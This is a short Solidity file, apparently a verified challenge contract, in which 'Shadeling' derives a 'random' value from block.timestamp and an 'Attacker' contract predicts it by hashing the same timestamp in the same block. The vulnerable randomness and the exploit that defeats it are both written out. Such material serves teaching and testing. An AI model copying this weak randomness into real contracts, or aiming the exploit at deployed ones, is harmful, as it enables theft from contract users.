/**
 *Submitted for verification at Etherscan.io on 2022-11-28
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract Shadeling {
    bool public isPredicted;

    function predict(bytes32 x) external {
        require(x == _random());
        isPredicted = true;
    }

    function _random() internal view returns (bytes32) {
        return keccak256(abi.encode(block.timestamp));
    }
}

contract Attacker {

    function predict(Shadeling shadeling) external {
        shadeling.predict(
            keccak256(abi.encode(block.timestamp))
        );
    }

}